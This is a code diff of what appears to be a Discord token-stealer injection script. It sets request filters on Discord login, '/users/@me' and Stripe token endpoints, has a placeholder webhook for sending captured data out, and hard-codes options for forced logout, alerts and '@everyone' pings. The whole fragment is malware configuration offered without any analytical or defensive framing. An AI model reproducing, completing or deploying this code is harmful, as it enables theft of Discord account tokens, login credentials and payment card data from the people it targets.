@@ -7,7 +7,7 @@ const fs = require('fs');
 const path = require('path');
 const querystring = require("querystring");
 const os = require('os')
-const webhook = "%WEBHOOK_LINK%";
+const webhook = "%WEBHOOK%";
 const Filters = {
     1: {
     	urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v1/tokens"]
@@ -18,11 +18,11 @@ const Filters = {
 };
 
 const config = {
-    "logout": "%LOGOUT%",
-    "logout-notify": "%LOGOUTNOTI%",
-    "init-notify": "%INITNOTI%",
+    "logout": "true",
+    "logout-notify": "true",
+    "init-notify": "true",
     "embed-color": 3447704,
-    "disable-qr-code": "%DISABLEQRCODE%",
+    "disable-qr-code": "false",
     "ping": [ true, "@everyone" ]
 };
 
